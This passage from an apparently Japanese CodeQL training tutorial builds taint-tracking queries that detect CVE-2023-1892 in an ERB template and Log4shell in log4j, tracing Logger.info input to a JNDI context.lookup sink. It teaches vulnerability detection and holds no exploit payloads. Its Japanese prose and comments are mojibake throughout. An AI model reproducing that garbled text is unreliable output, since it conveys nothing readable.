      var.getVariable().getName() = name // @period ã® name
    )
  }

  // <%= name %>
  InstanceVariableAccess erbOutputVariable(string name) {
    exists(ErbOutputDirective output |
      result.getVariable().getName() = name and // @period ã®name
      output.getTerminalStmt() = result // <%= @period %>
    )
  }

  /*
    (node1)params[:period] -> (node2) <%= @period<-ã“ã‚Œ %>
  */
  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {
    exists(string name |
      node1.asExpr().getExpr() = variableAssignValue(name) and // node1: params[:period]
      node2.asExpr().getExpr() = erbOutputVariable(name) // node2: <%= @period<-ã“ã‚Œ %>
    )
  }
}

from DataFlow::PathNode src, DataFlow::PathNode sink, Configuration config
where config.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "Detected CVE-2023-1892!"

```

</details>

## (Java) Log4shell

### èª²é¡Œ7
* ã‚½ãƒ¼ã‚¹ã¨ã‚·ãƒ³ã‚¯ã®ã‚¯ã‚¨ãƒªã‚’å®Ÿè£…ã—ã¦ãã ã•ã„
* (é›£æ˜“åº¦é«˜)ä½™è£•ãŒã‚ã‚Œã°å…¨éƒ¨è‡ªåˆ†ã§å®Ÿè£…ã—ã¦ã¿ã¦ãã ã•ã„

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä½œæˆã—ãŸã‚‚ã®ãŒã‚ã‚‹ã®ã§ãã‚Œã‚’åˆ©ç”¨ã—ã¦ãã ã•ã„
https://drive.google.com/file/d/1eP5aZ_Pwa495yvAy_Aekb3gytQNtzgm1/view?usp=sharing

#### ã‚¯ã‚¨ãƒªã®ãƒ†ãƒ³ãƒ—ãƒ¬
â€» addiionalTaintStepãŒè¤‡é›‘ãªã®ã§ã“ã¡ã‚‰å´ã§å®Ÿè£…ã—ã¦ã„ã¾ã™ãŒã€å…¨éƒ¨è‡ªåˆ†ã§æ›¸ããŸã„äººã¯è¦‹ãªã„ã§ã‚„ã£ã¦ã‚‚ã„ã„ã§ã™

<details>
<summary>!!Spoiler Alert!!</summary>

```
/**
 * @kind path-problem
 */
import java
import semmle.code.java.dataflow.DataFlow
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph


class Test1TaintStep extends TaintTracking::AdditionalTaintStep {

    /*
      logging-log4j2/log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java:1989
      messageFactory.newMessage(message)
      logging-log4j2/log4j-api/src/main/java/org/apache/logging/log4j/message/ReusableMessageFactory.java:94
      result.set(charSequence);
    */
    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists( MethodAccess methodAccess, Method method | 
            methodAccess.getMethod() = method and // result.set(charSequence);
            method.getName() = "set" and 
            method.getNumberOfParameters() = 1 and // result.set(charSequence)ã®å¼•æ•°ã®æ•°
            methodAccess.getEnclosingCallable().getDeclaringType().getName() = "ReusableMessageFactory" and // ã‚¯ãƒ©ã‚¹ãŒReusableMessageFactory
            node1.asExpr() = methodAccess.getArgument(0) and
            node2.asExpr() = methodAccess.getQualifier() // æ±šæŸ“å¯¾è±¡ã‚’(node1)messege -> (node2)result
        )
    }
}


class Test2TaintStep extends TaintTracking::AdditionalTaintStep {

  /*
    logging-log4j2/log4j-core/src/main/java/org/apache/logging/log4j/core/config/LoggerConfig.java:454
    ((LocationAwareLogEventFactory) logEventFactory).createEvent(loggerName, marker, fqcn, location, level, data, props, t)
    logging-log4j2/log4j-core/src/main/java/org/apache/logging/log4j/core/impl/ReusableLogEventFactory.java:100
    result.setMessage(message);
  */
  override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
      exists( MethodAccess methodAccess, Method method | 
          methodAccess.getMethod() = method and // result.setMessage(message);
          method.getName() = "setMessage" and 
          method.getNumberOfParameters() = 1 and // setMessageãƒ¡ã‚½ãƒƒãƒ‰ã®å¼•æ•°ã®æ•°
          methodAccess.getEnclosingCallable().getDeclaringType().getName() = "ReusableLogEventFactory" and // ã‚¯ãƒ©ã‚¹ãŒReusableLogEventFactory
          node1.asExpr() = methodAccess.getArgument(0) and
          node2.asExpr() = methodAccess.getQualifier() // æ±šæŸ“å¯¾è±¡ã‚’(node1)message -> (node2)reult
      )
  }
}


class Configuration extends TaintTracking::Configuration {

  Configuration() { this = "log4shell" }

  /*
    logging-log4j2/log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java:1299
    public void info(final CharSequence message)
  */
  override predicate isSource(DataFlow::Node source) {    
    ãƒ»ãƒ»ãƒ»
  }

  /*
    logging-log4j2/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java:172
    return (T) this.context.lookup(name);
  */
  override predicate isSink(DataFlow::Node sink) { 
    ãƒ»ãƒ»ãƒ»
  }
}


from DataFlow::PathNode src, DataFlow::PathNode sink, Configuration config
where config.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "Detected Log4shell!"

```

</details>


#### ã‚½ãƒ¼ã‚¹:
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java
```java
    @Override
    public void info(final CharSequence message) {
        logIfEnabled(FQCN, Level.INFO, null, message, null);
    }
```

#### ã‚·ãƒ³ã‚¯:
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L172C31-L172C31
```java
    public <T> T lookup(final String name) throws NamingException {
        return (T) this.context.lookup(name);
    }
```


AST viewerã¨ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’è¦‹ãªãŒã‚‰ã‚¯ã‚¨ãƒªã‚’ä½œã£ã¦ã„ãã¾ã—ã‚‡ã†
![](https://tyage.github.io/seccamp-2023-images/upload_1c6b9e86e68459e932e1684abe90cf3d.png)

Method Module
https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/type.Member$Method.html

<details>
<summary>!!Spoiler Alert!!</summary>
    
ã‚½ãƒ¼ã‚¹
```
  override predicate isSource(DataFlow::Node source) {    
    exists( Method method |
        method.getName() = "info" and // info(CharSequence message)ã®ãƒ¡ã‚½ãƒƒãƒ‰å
        method.getNumberOfParameters() = 1 and // info(CharSequence message)ã®å¼•æ•°ã®æ•°
        method.getParameterType(0).(RefType).hasQualifiedName("java.lang", "CharSequence") and // å¼•æ•°ã®å‹ãŒCharSequence
        source.asParameter() = method.getParameter(0) and //ã‚½ãƒ¼ã‚¹ã‚’info(CharSequence message)ã®ç¬¬ä¸€å¼•æ•°ã«æŒ‡å®š
        method.getDeclaringType().getASourceSupertype+().hasQualifiedName("org.apache.logging.log4j", "Logger") // infoãƒ¡ã‚½ãƒƒãƒ‰ã®å‘¼ã³å‡ºã—å…ƒã‚¯ãƒ©ã‚¹ãŒorg.apache.logging.log4j.Logger
    )
  }
```

</details>
    
ã‚·ãƒ³ã‚¯ã‚‚åŒæ§˜ã«AST viewerã‚’è¦‹ãªãŒã‚‰ã‚¯ã‚¨ãƒªã‚’ä½œæˆã—ã¦ã„ã
![](https://tyage.github.io/seccamp-2023-images/upload_98d55196a77f8dacb27a41c508c25562.png)

MethodAccess Module
https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$MethodAccess.html

<details>
<summary>!!Spoiler Alert!!</summary>

ã‚·ãƒ³ã‚¯
```
  override predicate isSink(DataFlow::Node sink) { 
    exists( MethodAccess methodAccess |
        methodAccess.getMethod().getName() = "lookup" and // context.lookup(name) ã®ãƒ¡ã‚½ãƒƒãƒ‰å
        methodAccess.getMethod().getNumberOfParameters() =  1 and // context.lookup(name)ã®å¼•æ•°ã®æ•°
        methodAccess.getMethod().getDeclaringType().hasQualifiedName("javax.naming", "Context") and // lookupãƒ¡ã‚½ãƒƒãƒ‰ã®å‘¼ã³å‡ºã—å…ƒã‚¯ãƒ©ã‚¹ãŒjavax.naming.Context
        methodAccess.getAnArgument() = sink.asExpr() // ã‚·ãƒ³ã‚¯ã‚’context.lookup(name)ã®å¼•æ•°ã«æŒ‡å®š
    )
  }
```

</details>

AdditionalTaintStepã«ä»˜ã„ã¦ã®è§£èª¬

<details>
<summary>!!Spoiler Alert!!</summary>

ã“ã®ã¾ã¾ã ã¨é€”ä¸­ã§taint trackingãŒåˆ‡ã‚Œã¦ã—ã¾ã†ã®ã§ã€AdditionalTaintStepã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚‹
å®Ÿè£…ã®å‰ã«ã©ã“ã¾ã§trackingã§ãã¦ã„ã‚‹ã‹ç¢ºèªã™ã‚‹
sinkã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’åºƒã’ã¦ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ã€æœ¬æ¥ã®sinkã¾ã§ã®ã‚¹ãƒ†ãƒƒãƒ—ãŒã©ã“ã¾ã§è¿½ãˆã¦ã„ã‚‹ã‹ç¢ºèªã™ã‚‹

```
class Configuration extends TaintTracking::Configuration {

  Configuration() { this = "log4shell" }

  override predicate isSource(DataFlow::Node source) {    
    exists( Method method |
        method.getName() = "info" and // info(CharSequence message)ã®ãƒ¡ã‚½ãƒƒãƒ‰å
        method.getNumberOfParameters() = 1 and // info(CharSequence message)ã®å¼•æ•°ã®æ•°
        method.getParameterType(0).(RefType).hasQualifiedName("java.lang", "CharSequence") and // å¼•æ•°ã®å‹ãŒCharSequence
        source.asParameter() = method.getParameter(0) and //ã‚½ãƒ¼ã‚¹ã‚’info(CharSequence message)ã®ç¬¬ä¸€å¼•æ•°ã«æŒ‡å®š
        method.getDeclaringType().getASourceSupertype+().hasQualifiedName("org.apache.logging.log4j", "Logger") // infoãƒ¡ã‚½ãƒƒãƒ‰ã®å‘¼ã³å‡ºã—å…ƒã‚¯ãƒ©ã‚¹ãŒorg.apache.logging.log4j.Logger
    )
  }

  override predicate isSink(DataFlow::Node sink) { 
    exists( MethodAccess methodAccess |
        methodAccess.getMethod().getName() = "lookup" and // context.lookup(name) ã®ãƒ¡ã‚½ãƒƒãƒ‰å
        methodAccess.getMethod().getNumberOfParameters() =  1 and // context.lookup(name)ã®å¼•æ•°ã®æ•°
        methodAccess.getMethod().getDeclaringType().hasQualifiedName("javax.naming", "Context") and // lookupãƒ¡ã‚½ãƒƒãƒ‰ã®å‘¼ã³å‡ºã—å…ƒã‚¯ãƒ©ã‚¹ãŒjavax.naming.Context
        methodAccess.getAnArgument() = sink.asExpr() // ã‚·ãƒ³ã‚¯ã‚’context.lookup(name)ã®å¼•æ•°ã«æŒ‡å®š
    )
  }
}

from DataFlow::PathNode src, DataFlow::PathNode sink, Configuration config
where config.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "Detected Log4shell!"

```

å®Ÿè¡Œã™ã‚‹ã¨ReusableMessageFactory.newMessageå†…ã®`retult.set(message)`ã‚’å®Ÿè¡Œå¾Œtackingå¯¾è±¡ãŒresultã«ç§»ã£ã¦ã„ãªã„ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚

![](https://tyage.github.io/seccamp-2023-images/upload_406e8ba7b1ea4e2184221daf404b356b.png)


TaintTracking::AdditionalTaintStepã‚’ç¶™æ‰¿ã—ãŸã‚¯ãƒ©ã‚¹ã‚’ä½œã£ã¦ã€ä¸Šè¨˜ã®resultãŒtrackigã®å¯¾è±¡ã¨ãªã‚‹ã‚ˆã†è¿½åŠ ã®taint stepã‚’å®Ÿè£…ã™ã‚‹
```
class Test1TaintStep extends TaintTracking::AdditionalTaintStep {

    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists( MethodAccess methodAccess, Method method | 
            methodAccess.getMethod() = method and
            method.getName() = "set" and
            method.getNumberOfParameters() = 1 and
            methodAccess.getEnclosingCallable().getDeclaringType().getName() = "ReusableMessageFactory" and
            node1.asExpr() = methodAccess.getArgument(0) and
            node2.asExpr() = methodAccess.getQualifier()
        )
    }
}
```

ã‚‚ã†ä¸€åº¦ã‚¯ã‚¨ãƒªå…¨ä½“ã‚’å®Ÿè¡Œã—ã¦ã¿ã‚‹ãŒã€ã¾ã sinkã¾ã§trackingã§ãã¦ã„ãªã„ã®ã§å…ˆã»ã©ã¨åŒæ§˜sinkã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’åºƒã’ã¦ã©ã“ã¾ã§è¿½ãˆã¦ã„ã‚‹ã‹ãƒ‡ãƒãƒƒã‚°ã™ã‚‹ã¨ReusableLogEventFactory.createEventå†…ã®`result.setMessage(message)`ã¾ã§ã¯è¿½ãˆã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚‹

![](https://tyage.github.io/seccamp-2023-images/upload_c17fed521556ea3b1eaeacc267d87f62.png)

åŒã˜ã‚ˆã†ã«TaintTracking::AdditionalTaintStepã‚’ç¶™æ‰¿ã—ãŸã‚¯ãƒ©ã‚¹ã‚’ä½œã£ã¦`result.setMessage(message)`ã‚’è¿½è·¡ã™ã‚‹ã‚ˆã†å®Ÿè£…ã™ã‚‹

```
class Test2TaintStep extends TaintTracking::AdditionalTaintStep {

  override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
      exists( MethodAccess methodAccess, Method method | 
          methodAccess.getMethod() = method and
          method.getName() = "setMessage" and
          method.getNumberOfParameters() = 1 and
          methodAccess.getEnclosingCallable().getDeclaringType().getName() = "ReusableLogEventFactory" and
          node1.asExpr() = methodAccess.getArgument(0) and
          node2.asExpr() = methodAccess.getQualifier()
      )
  }
}
```

</details>

ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã‚·ãƒ³ã‚¯ã¾ã§ãƒˆãƒ©ãƒƒã‚­ãƒ³ã‚°ã§ãã‚‹ã“ã¨ãŒç¢ºèªã§ãã‚‹
![](https://tyage.github.io/seccamp-2023-images/upload_e5854e6674cbccb5ff20fb8d08796174.png)

# æœ€å¾Œã«

CodeQLã¯ãƒ‘ãƒ¼ãƒ•ã‚§ã‚¯ãƒˆãªé“å…·ã§ã¯ãªãè‡ªå‹•åŒ–ã®é›£ã—ã„è„†å¼±æ€§ã‚‚å¤šã€…ã‚ã‚Šã¾ã™ãŒã€ã‚ã‚‹ç¨‹åº¦è¤‡é›‘ãªè„†å¼±æ€§ã‚‚è‡ªå‹•çš„ã«æ¤œçŸ¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€CodeQLãƒªãƒã‚¸ãƒˆãƒªã«ã¯æ§˜ã€…ãªã‚¯ã‚¨ãƒªãŒç”¨æ„ã•ã‚Œã¦ã„ã¦çŸ¥è¦‹ã®å®åº«ã«ãªã£ã¦ãŠã‚Šã€èª­ã‚€ã ã‘ã§å¾—ã‚‰ã‚Œã‚‹ã“ã¨ãŒå¤šã„ã§ã™ã€‚
https://github.com/github/codeql

å„è¨€èªã®`ql/src/Security`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§CWEï¼ˆå…±é€šè„†å¼±æ€§ã‚¿ã‚¤ãƒ—ï¼‰ã”ã¨ã«ã‚¯ã‚¨ãƒªã¨ãƒ†ã‚¹ãƒˆã‚³ãƒ¼ãƒ‰ãŒã¾ã¨ã‚ã‚‰ã‚Œã¦ã„ã‚‹ã®ã§ã€èˆˆå‘³ã®ã‚ã‚‹äººã¯ã“ã®è¾ºã‚’çœºã‚ã¦ã¿ã¦ã¯ã€‚
https://github.com/github/codeql/tree/main/javascript/ql/src/Security
https://github.com/github/codeql/tree/main/javascript/ql/test/query-tests/Security

ã¾ãŸã€ä»Šå›ã¯é™çš„è§£æã€Taint Trackingã‚’å–ã‚Šä¸Šã’ã¾ã—ãŸãŒã€è„†å¼±æ€§ã‚’æ¤œå‡ºã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯æ§˜ã€…ãªè¦³ç‚¹ã€æ‰‹æ³•ãŒã‚ã‚Šã¾ã™ã€‚
ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰èª­ã‚“ã§è„†å¼±æ€§æ¢ã™ã®æ¥½ã—ã„ãªã€œã¨æ€ã£ã¦ã‚‚ã‚‰ãˆãŸã‚‰å¹¸ã„ã§ã™ã€‚
